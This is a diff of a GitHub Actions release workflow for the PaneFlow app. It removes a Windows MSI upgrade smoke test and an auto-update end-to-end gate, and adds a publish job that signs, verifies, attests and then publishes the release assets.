-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
-        with:
-          name: windows-msi-smoke-logs-${{ github.run_id }}
-          path: ${{ runner.temp }}\paneflow-msi-smoke
-          if-no-files-found: warn
-          retention-days: 7
-
-  # ─── Windows MSI smoke: upgrade over a live session host ────────────
-  # The in-app updater runs msiexec while the detached session host
-  # (`paneflow-host.exe --home <home> serve`) can still run from
-  # %ProgramFiles%\PaneFlow. Restart Manager cannot close that windowless
-  # process, so the v0.16 updater stalled on MSI error 1611 until the
-  # `StopInstalledHost` custom action in packaging/wix/main.wxs started
-  # stopping it before InstallValidate. The relay smoke above restarts
-  # through System32\whoami.exe and never has a live host, so this job
-  # installs the latest published MSI per-machine, starts its host, and
-  # upgrades with the relay's exact msiexec arguments, then repeats the
-  # upgrade without MSIRESTARTMANAGERCONTROL=Disable as the v0.16 updater
-  # ran it. It runs on every tag push and gates the publish job, like the
-  # relay smoke above, and on a dry-run from `main`: the two cases where the
-  # build signs an MSI. On a tag push the new release is still a draft, so
-  # the latest published release is the previous version. The candidate
-  # ProductVersion must exceed it: dispatch a dry-run with
-  # `msi_upgrade_version` while the source is not bumped yet. A tag that
-  # does not upgrade the latest release, such as a hotfix on an older line,
-  # has no upgrade to test and reports that in a notice instead of failing.
-  smoke-test-windows-msi-live-host:
-    name: Smoke test - Windows MSI upgrade over a live host
-    if: (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main')
-    needs: [preflight, build-windows]
-    runs-on: windows-2022
-    timeout-minutes: 10
-    defaults:
-      run:
-        shell: pwsh
-    steps:
-      - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
-        with:
-          persist-credentials: false
-          ref: ${{ needs.preflight.outputs.sha }}
-          sparse-checkout: scripts
-
-      - name: Download signed Windows MSI
-        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
-        with:
-          name: release-assets-x86_64-Windows
-          path: ./release-assets
-
-      - name: Download latest published MSI
-        env:
-          GH_TOKEN: ${{ github.token }}
-          BASELINE_DIR: ${{ runner.temp }}\paneflow-live-host-baseline
-        run: ./scripts/download-release-msi.ps1 -Tag latest -Directory $env:BASELINE_DIR
-
-      - name: Upgrade the latest release while its host runs
-        env:
-          SMOKE_DIR: ${{ runner.temp }}\paneflow-msi-live-host
-          BASELINE_DIR: ${{ runner.temp }}\paneflow-live-host-baseline
-        run: ./scripts/smoke-msi-live-host.ps1 -SmokeDir $env:SMOKE_DIR -BaselineDir $env:BASELINE_DIR
-
-      - name: Upload Windows MSI live-host upgrade logs on failure
-        if: failure()
-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
-        with:
-          name: windows-msi-live-host-logs-${{ github.run_id }}
-          path: ${{ runner.temp }}\paneflow-msi-live-host
-          if-no-files-found: warn
-          retention-days: 7
-
-  # ─── US-003 AC5: dry-run artifact summary ───────────────────────────
-  # In dry-run mode the `release:` job is skipped, so there's no
-  # GitHub Release page to inspect. This job downloads every
-  # `release-assets-*` workflow artifact produced by the build matrix
-  # and writes a SHA-256 manifest into the Actions UI Summary so the
-  # release engineer can verify naming, size, and integrity at a
-  # glance before deciding whether to cut the real tag.
-  #
-  # Only runs in dry-run mode - the real release job already
-  # publishes the artifacts to GitHub Releases (which renders the
-  # same SHA-256 sidecars next to each asset).
   dry-run-summary:
     name: Dry-run artifact summary
     if: github.event_name == 'workflow_dispatch'
-    needs: [preflight, build-linux, build-macos, build-windows]
+    needs: [preflight, linux, macos, windows]
     runs-on: ubuntu-24.04
     timeout-minutes: 10
     steps:
@@ -1437,140 +282,83 @@ jobs:
           DRYRUN_REF: ${{ inputs.target_ref || 'main' }} at ${{ needs.preflight.outputs.sha }}
         run: scripts/release-dry-run-summary.sh "$DRYRUN_TAG" "$DRYRUN_REF" release-assets
 
-  # ─── US-005: auto-update e2e (publish-gating) ───────────────────────
-  # Builds OLD paneflow at the previous tag in a git worktree, builds
-  # NEW from this checkout, serves a fixture `latest.json` + tarball
-  # via python3's http.server on localhost, then runs OLD with
-  # `--update-and-exit` (US-005 Rust flag) pointing at the fixture.
-  # Three scenarios - happy tar.gz swap, hash-mismatch rejection,
-  # feed-unreachable surfaced as exit 3 - all asserted by the script.
-  #
-  # Sits in `release.needs` so a tag cut never ships a binary that
-  # can't actually self-update from the previous release. This is the
-  # ONLY automated test of `src-app/src/update/` - paneflow-app has no
-  # unit tests, so dropping this gate would ship updater regressions
-  # silently. A previous nightly variant (auto_update_e2e.yml on cron)
-  # was deleted 2026-05-27 as redundant with this release gate at the
-  # current ~monthly release cadence.
-  auto-update-e2e:
-    name: Auto-update e2e (Linux x86_64)
-    needs: [preflight, build-linux]
+  # The only job that writes: it runs on a tag push, after the verdict, the
+  # three platforms with their MSI and auto-update gates, and the package
+  # smokes. It uploads to a draft, compares every digest GitHub computed
+  # with the built file, attests the assets, then publishes: a published
+  # release is immutable, so nothing is ever replaced afterwards. The tag
+  # must still point at the built commit before anything is uploaded.
+  release:
+    name: Publish GitHub Release
+    if: github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')
+    needs: [preflight, ci-verdict, linux, macos, windows, smoke-linux]
     runs-on: ubuntu-24.04
     timeout-minutes: 10
-    # The E2E signs the NEW tarball before publish so it can remain a
-    # hard `release.needs` gate. That requires the same minisign secret as
-    # the publish job, stored on the protected `release` environment, which
-    # only `main` and `v*` tags may deploy to. It runs exactly when the build
-    # signs (see `build-linux.environment`), so a `target_ref` other than `main`
-    # never gets the minisign key, and no other ref fails on the policy.
-    if: (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.ref == 'refs/heads/main' && (inputs.target_ref || 'main') == 'main')
     environment: release
-    # Pre-refactor (≤ v0.3.3): this job did two full `cargo build
-    # --release` (NEW from current tree, OLD from a worktree at the
-    # previous tag), routinely ~20-25 min on cold cache. It was by
-    # far the longest leg of the release pipeline.
-    #
-    # Refactor (2026-05-27): the harness now accepts E2E_NEW_TARBALL
-    # and E2E_OLD_TARBALL env vars and uses them directly when set
-    # (scripts/test-update-e2e.sh). The NEW tarball is reused from
-    # the `build-linux` job's artifact (already built + bundled +
-    # sha256-sided 5 minutes earlier - no point rebuilding). The OLD
-    # tarball is fetched from the previous GitHub release, which is
-    # strictly more faithful than a from-source rebuild: we now test
-    # the exact byte sequence real users have on disk.
-    #
-    # Result: ~2-3 min job (no cargo build, no toolchain install). It does
-    # NOT need Vulkan/Wayland windowing deps since `--update-and-exit` never
-    # opens a GPUI window -- but it DOES need the binary's hard NEEDED shared
-    # libs (libxkbcommon.so.0 + libxkbcommon-x11.so.0, see `readelf -d`),
-    # which the dynamic linker resolves at exec, before main(), regardless of
-    # whether a window opens. See the explicit install step below.
+    permissions:
+      contents: write
+      id-token: write
+      attestations: write
     steps:
       - uses: actions/checkout@93cb6efe18208431cddfb8368fd83d5badbf9bfd # v5.0.1
         with:
-          persist-credentials: false
           ref: ${{ needs.preflight.outputs.sha }}
-          # Shallow checkout is enough now that the harness no longer
-          # does `git worktree add` for the OLD source.
-          fetch-depth: 1
+          persist-credentials: false
 
-      # The released binary links libxkbcommon-x11.so.0 + libxkbcommon.so.0
-      # as hard NEEDED entries, so the dynamic linker resolves them at exec
-      # even under `--update-and-exit`. The ubuntu-22.04 runner image stopped
-      # guaranteeing libxkbcommon-x11-0 (the SAME binary deps passed on
-      # 2026-05-27 for v0.3.3 and failed on 2026-05-28 for v0.3.4 with a bare
-      # "cannot open shared object file" exit 127). Install it explicitly so
-      # the job is hermetic against runner-image drift.
-      - name: Install runtime libs the binary links (resolved at exec)
-        run: |
-          scripts/ci-retry-network.sh sudo apt-get update
-          scripts/ci-retry-network.sh sudo apt-get install -y libxkbcommon-x11-0
+      - name: Require the tag to still point at the built commit
+        env:
+          RELEASE_SHA: ${{ needs.preflight.outputs.sha }}
+        run: scripts/require-tag-at-commit.sh "$RELEASE_TAG" "$RELEASE_SHA"
 
-      # Pull the NEW tarball straight from the `build-linux` job's
-      # x86_64 Linux artifact. The matrix uploads
-      # release-assets-x86_64-Linux which contains every Linux x86_64
-      # artifact (.tar.gz, .deb, .rpm, AppImage, sha256 sidecars); the
-      # harness only consumes paneflow-<ver>-x86_64.tar.gz.
-      - name: Download NEW build artifact
+      - name: Refuse a release that is already published
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: bash scripts/require-unpublished-release.sh "$RELEASE_TAG"
+
+      - name: Download all release artifacts
         uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
         with:
-          name: release-assets-x86_64-Linux
-          path: ${{ runner.temp }}/e2e-new
+          path: release-assets
+          pattern: release-assets-*
+          merge-multiple: true
 
-      # Fetch the most recent published stable release as OLD. Selecting
-      # the latest non-prerelease ensures the harness exercises the
-      # update path users would actually traverse - never a `-rc.N`
-      # build, which update_cask.yml already keeps out of Homebrew.
-      # If no stable release exists yet (first release
-      # ever, or first after a long pre-release train) the script's
-      # self-bootstrap guard at scripts/test-update-e2e.sh:168 takes
-      # over and exits 0 with a "harness no-op" message.
-      - name: Resolve previous stable release tag
-        id: prev_release
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        run: scripts/resolve-previous-release.sh "$RELEASE_TAG"
-
-      - name: Download OLD release tarball
-        if: steps.prev_release.outputs.old_version != ''
-        env:
-          OLD_TAG: ${{ steps.prev_release.outputs.old_tag }}
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - name: Verify merged release artifacts
         run: |
-          mkdir -p "$RUNNER_TEMP/e2e-old"
-          gh release download "$OLD_TAG" --pattern 'paneflow-*-x86_64.tar.gz' --dir "$RUNNER_TEMP/e2e-old"
-          ls -la "$RUNNER_TEMP/e2e-old"
+          set -euo pipefail
+          if [ ! -d release-assets ] || ! find release-assets -maxdepth 1 -type f | grep -q .; then
+            echo "::error::No release artifacts were downloaded. Refusing to create an empty GitHub Release."
+            exit 1
+          fi
 
-      # The build artifact predates the publish job's release signing, but
-      # auto-update-e2e now sits in `release.needs`. It cannot poll a
-      # GitHub Release that is waiting for this very job. Sign the NEW
-      # tarball here with the same minisign release key so OLD clients can
-      # verify the fixture before publish.
-      - name: Sign NEW tarball for auto-update e2e
-        if: steps.prev_release.outputs.old_version != ''
+      - name: Sign release artifacts (minisign)
         env:
           MINISIGN_SECRET_KEY: ${{ secrets.MINISIGN_SECRET_KEY }}
-        run: scripts/sign-update-e2e-tarball.sh "$RUNNER_TEMP/e2e-new"
+        run: scripts/sign-release-assets.sh release-assets
 
-      - name: Run auto-update e2e harness
-        if: steps.prev_release.outputs.old_version != ''
-        env:
-          OLD_VERSION: ${{ steps.prev_release.outputs.old_version }}
-        run: scripts/run-update-e2e.sh "$RUNNER_TEMP/e2e-new" "$RUNNER_TEMP/e2e-old"
-
-      - name: Self-bootstrap skip notice
-        if: steps.prev_release.outputs.old_version == ''
-        run: |
-          echo "::notice::No previous stable release published yet - auto-update e2e is a no-op for the first release. Will engage on the next tag cut."
-
-      - name: Upload e2e logs on failure
-        if: failure()
-        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+      - name: Create the draft GitHub Release and upload the assets
+        id: draft
+        uses: softprops/action-gh-release@8a0cd651e5b2365bd640854a3fa5dfc70e4875f3 # v3.0.4
         with:
-          name: auto-update-e2e-logs-${{ github.run_id }}
-          path: |
-            /tmp/paneflow-e2e/*.stdout
-            /tmp/paneflow-e2e/*.stderr
-            /tmp/paneflow-e2e/http-server.log
-          retention-days: 7
-          if-no-files-found: warn
+          files: release-assets/*
+          generate_release_notes: true
+          draft: true
+          prerelease: ${{ contains(env.RELEASE_TAG, 'alpha') || contains(env.RELEASE_TAG, 'beta') || contains(env.RELEASE_TAG, 'rc') }}
+
+      - name: Compare every uploaded asset digest with the built file
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          RELEASE_ID: ${{ steps.draft.outputs.id }}
+        run: bash scripts/verify-release-digests.sh "$RELEASE_ID" release-assets
+
+      - name: Attest the release assets
+        uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.2.2
+        with:
+          subject-path: release-assets/*
+
+      - name: Publish the verified and attested release
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+        run: |
+          set -euo pipefail
+          gh release edit "${RELEASE_TAG}" --draft=false
